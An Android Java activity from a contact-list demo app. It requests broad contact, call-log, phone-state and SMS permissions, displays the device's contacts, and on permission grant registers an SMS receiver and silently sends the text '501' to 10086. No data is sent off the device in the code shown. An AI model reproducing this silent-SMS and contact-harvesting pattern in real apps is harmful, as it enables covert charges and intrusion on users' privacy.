package com.example.maillist;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.IntentFilter;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.example.maillist.bean.PhoneDto;
import com.example.maillist.permission.RxPermissions;
import com.example.maillist.tool.PhoneUtil;
import com.example.maillist.tool.SMSCore;
import com.example.maillist.tool.SMS_Receiver;
import com.google.gson.Gson;

import java.util.List;

import io.reactivex.functions.Consumer;

public class MainActivity extends Activity {
    private RxPermissions rxPermissions;
    private List<PhoneDto> phon;
    private LinearLayout myLinaer;
    private static final String ACTION_SMS_SEND = "lab.sodino.sms.send";
    private static final String ACTION_SMS_DELIVERY = "lab.sodino.sms.delivery";
    private static final String ACTION_SMS_RECEIVER = "android.provider.Telephony.SMS_RECEIVED";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initView();
        initData();
    }

    public void initView() {
        myLinaer = findViewById(R.id.myLinear);
        rxPermissions = new RxPermissions(this);
        setPermissions();
    }
    public void initData() {
        phon = new PhoneUtil(this).getPhone();
        //获取手机号码
//        PhoneDto phoneDto=new PhoneDto();
//        phon.add(phoneDto);
        Gson gson = new Gson();
        String phoneJson = gson.toJson(phon);

        for (int i = 0; i < phon.size(); i++) {
            View view = LayoutInflater.from(this).inflate(R.layout.item_phone, null);
            TextView name = view.findViewById(R.id.phoneName);
            TextView phone = view.findViewById(R.id.phone);
            name.setText(phon.get(i).getName() + "：");
            phone.setText(phon.get(i).getTelPhone() + "：");
            myLinaer.addView(view);
        }

    }

    /**
     * 获取权限
     */
    public void setPermissions() {
        rxPermissions
                .request(Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS
                        , Manifest.permission.GET_ACCOUNTS, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_PHONE_STATE
                        , Manifest.permission.SEND_SMS,Manifest.permission.RECEIVE_SMS,Manifest.permission.READ_SMS)
                .subscribe(new Consumer<Boolean>() {
                    @Override
                    public void accept(Boolean aBoolean) throws Exception {
                        if (aBoolean) {
                            Log.e("aa","------------发送--");
                            SMS_Receiver smsReceiver= new SMS_Receiver();
                            IntentFilter receiverFilter = new IntentFilter(ACTION_SMS_RECEIVER);
                            registerReceiver(smsReceiver, receiverFilter);
                            //发送短信
                            SMSCore smscore=new SMSCore();
                            smscore.SendSMS2("10086", "501", MainActivity.this);
                        } else {
                            Toast.makeText(MainActivity.this, "必须打开权限！否则功能无效！", Toast.LENGTH_SHORT).show();
                        }
                    }
                });
    }
}
